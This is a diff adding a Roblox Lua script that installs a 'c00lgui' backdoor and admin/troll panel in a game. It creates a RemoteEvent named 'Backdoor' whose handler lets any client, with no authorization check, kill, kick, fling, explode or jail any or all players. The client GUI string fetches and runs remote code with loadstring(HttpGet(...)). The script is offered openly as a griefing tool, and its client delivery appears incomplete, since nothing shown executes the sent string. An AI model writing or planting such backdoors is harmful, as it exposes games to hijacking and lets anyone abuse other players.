@@ -1,0 +1,145 @@
+-- // PlazaRequire – Require:plaza("Username") → Full c00lgui Rayfield (Server-Sided) \\
+-- // Run in Dev Console → Server: Require:plaza("YourUsername") \\
+-- // Creates Backdoor + Sends Rayfield GUI to that player only \\
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- === CONFIG ===
+local BACKDOOR_NAME = "Backdoor"
+local RAYFIELD_URL = "https://sirius.menu/rayfield"
+
+-- === CREATE BACKDOOR REMOTEEVENT ===
+local Backdoor = ReplicatedStorage:FindFirstChild(BACKDOOR_NAME)
+if not Backdoor then
+    Backdoor = Instance.new("RemoteEvent")
+    Backdoor.Name = BACKDOOR_NAME
+    Backdoor.Parent = ReplicatedStorage
+end
+
+-- === SERVER-SIDED COMMAND HANDLER ===
+Backdoor.OnServerEvent:Connect(function(player, message)
+    if typeof(message) ~= "string" or not message:find("^;") then return end
+
+    local args = message:split(" ")
+    local cmd = args[1]:sub(2):lower()
+    local targetName = args[2] or "me"
+
+    -- Resolve target
+    local function getTargets(name)
+        name = name:lower()
+        if name == "me" then return {player} end
+        if name == "all" then return Players:GetPlayers() end
+        if name == "others" then
+            local list = {}
+            for _, p in Players:GetPlayers() do
+                if p ~= player then table.insert(list, p) end
+            end
+            return list
+        end
+        for _, p in Players:GetPlayers() do
+            if p.Name:lower():find(name) or p.DisplayName:lower():find(name) then
+                return {p}
+            end
+        end
+        return {player}
+    end
+
+    local targets = getTargets(targetName)
+
+    -- === COMMANDS (100% SERVER-SIDED) ===
+    local Commands = {
+        kill = function() for _, p in targets do if p.Character then p.Character:FindFirstChildOfClass("Humanoid").Health = 0 end end end,
+        kick = function() for _, p in targets do p:Kick("Kicked by c00lgui") end end,
+        bring = function() if player.Character then local r = player.Character.HumanoidRootPart for _, p in targets do if p.Character then p.Character.HumanoidRootPart.CFrame = r.CFrame * CFrame.new(0,0,-3) end end end end,
+        to = function() if player.Character then local r = player.Character.HumanoidRootPart for _, p in targets do if p.Character then r.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3) end end end end,
+        freeze = function() for _, p in targets do if p.Character then p.Character.HumanoidRootPart.Anchored = true end end end,
+        thaw = function() for _, p in targets do if p.Character then p.Character.HumanoidRootPart.Anchored = false end end end,
+        god = function() for _, p in targets do local h = p.Character and p.Character:FindFirstChildOfClass("Humanoid"); if h then h.MaxHealth = 1e9; h.Health = 1e9 end end end,
+        ungod = function() for _, p in targets do local h = p.Character and p.Character:FindFirstChildOfClass("Humanoid"); if h then h.MaxHealth = 100; h.Health = 100 end end end,
+        fling = function() for _, p in targets do if p.Character then local bv = Instance.new("BodyVelocity", p.Character.HumanoidRootPart); bv.MaxForce = Vector3.new(1e5,1e5,1e5); bv.Velocity = Vector3.new(math.random(-700,700),500,math.random(-700,700)); game.Debris:AddItem(bv,0.5) end end end,
+        explode = function() for _, p in targets do if p.Character then local e = Instance.new("Explosion", workspace); e.Position = p.Character.HumanoidRootPart.Position; e.BlastRadius = 40 end end end,
+        disco = function() for _, p in targets do if p.Character then task.spawn(function() for i=1,60 do for _,part in p.Character:GetDescendants() do if part:IsA("BasePart") then part.Color = Color3.fromHSV(tick()%5/5,1,1) end end task.wait(0.08) end end) end end end,
+        spin = function() for _, p in targets do if p.Character then task.spawn(function() local r = p.Character.HumanoidRootPart for i=1,120 do r.CFrame *= CFrame.Angles(0,math.rad(30),0) task.wait() end end) end end end,
+        jail = function() for _, p in targets do if p.Character then local r = p.Character.HumanoidRootPart local j = Instance.new("Part", workspace); j.Size = Vector3.new(7,9,7); j.Transparency = 0.7; j.Anchored = true; j.CanCollide = true; j.Color = Color3.fromRGB(30,30,30); j.CFrame = r.CFrame + Vector3.new(0,5,0); r.CFrame = j.CFrame; r.Anchored = true; game.Debris:AddItem(j,10); task.delay(10,function() if r and r.Parent then r.Anchored = false end end) end end end,
+        unjail = function() for _, p in targets do if p.Character then p.Character.HumanoidRootPart.Anchored = false end end end,
+        punish = function() for _, p in targets do if p.Character then p.Character:Destroy() end end end,
+        unpunish = function() for _, p in targets do p:LoadCharacter() end end end,
+        sword = function() for _, p in targets do local t = Instance.new("Tool", p.Backpack); t.Name = "Sword"; local h = Instance.new("Part", t); h.Name = "Handle"; h.Size = Vector3.new(1,5,0.5); h.Color = Color3.fromRGB(255,20,20); h.Material = Enum.Material.Neon end end,
+        gcoil = function() for _, p in targets do local c = Instance.new("Tool", p.Backpack); c.Name = "Gravity Coil"; c.RequiresHandle = false; local hum = p.Character and p.Character:FindFirstChildOfClass("Humanoid"); if hum then c.Equipped:Connect(function() hum.WalkSpeed = 36; hum.JumpPower = 120 end); c.Unequipped:Connect(function() hum.WalkSpeed = 16; hum.JumpPower = 50 end) end end end,
+    }
+
+    if Commands[cmd] then
+        Commands[cmd]()
+        print("[c00lgui] " .. player.Name .. " → ;" .. cmd .. " " .. targetName)
+    end
+end)
+
+-- === RAYFIELD GUI SCRIPT (sent to client) ===
+local RAYFIELD_GUI = [[
+    repeat task.wait() until game:IsLoaded()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Backdoor = ReplicatedStorage:WaitForChild("Backdoor")
+
+    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+    local Window = Rayfield:CreateWindow({
+        Name = "c00lgui | Plaza",
+        LoadingTitle = "c00lgui",
+        LoadingSubtitle = "Server-Sided",
+        ConfigurationSaving = { Enabled = true, FolderName = "c00lguiPlaza" },
+        KeySystem = false
+    })
+
+    _G.Target = "me"
+    local function fire(cmd, target)
+        target = target or _G.Target
+        Backdoor:FireServer(";" .. cmd .. " " .. target)
+    end
+
+    local TabAdmin = Window:CreateTab("Admin")
+    TabAdmin:CreateInput({ Name = "Target", PlaceholderText = "me/all/others/name", Callback = function(t) _G.Target = t:lower() end })
+
+    local adminCmds = { "kill", "kick", "bring", "to", "freeze", "thaw", "god", "ungod", "fling", "explode" }
+    for _, cmd in adminCmds do
+        TabAdmin:CreateButton({ Name = cmd:gsub("^%l", string.upper), Callback = function() fire(cmd) end })
+    end
+
+    local TabTroll = Window:CreateTab("Troll")
+    local trollCmds = { "disco", "spin", "jail", "unjail", "punish", "unpunish" }
+    for _, cmd in trollCmds do
+        TabTroll:CreateButton({ Name = cmd:gsub("^%l", string.upper), Callback = function() fire(cmd) end })
+    end
+
+    local TabTools = Window:CreateTab("Tools")
+    TabTools:CreateButton({ Name = "Sword", Callback = function() fire("sword") end })
+    TabTools:CreateButton({ Name = "Gravity Coil", Callback = function() fire("gcoil") end })
+
+    local TabMass = Window:CreateTab("Mass")
+    TabMass:CreateButton({ Name = "Mass Kill", Callback = function() fire("kill", "all") end })
+    TabMass:CreateButton({ Name = "Mass Fling", Callback = function() fire("fling", "all") end })
+
+    Rayfield:Notify({ Title = "c00lgui Loaded!", Content = "All commands are server-sided.", Duration = 5 })
+]]
+
+-- === Require:plaza("Username") FUNCTION ===
+local function plaza(username)
+    local targetPlayer = Players:FindFirstChild(username) or Players:FindFirstChild(username:lower()) or Players:FindFirstChild(username:gsub("^%l", string.upper))
+    if not targetPlayer then
+        warn("[PlazaRequire] Player '" .. username .. "' not found.")
+        return
+    end
+
+    -- Send GUI to player
+    Backdoor:FireClient(targetPlayer, RAYFIELD_GUI)
+    print("[PlazaRequire] c00lgui sent to " .. targetPlayer.Name)
+end
+
+-- === EXPOSE AS Require:plaza ===
+getfenv().Require = getfenv().Require or {}
+getfenv().Require.plaza = plaza
+
+print("PlazaRequire loaded! Use: Require:plaza(\"YourUsername\")")
+
+return {}
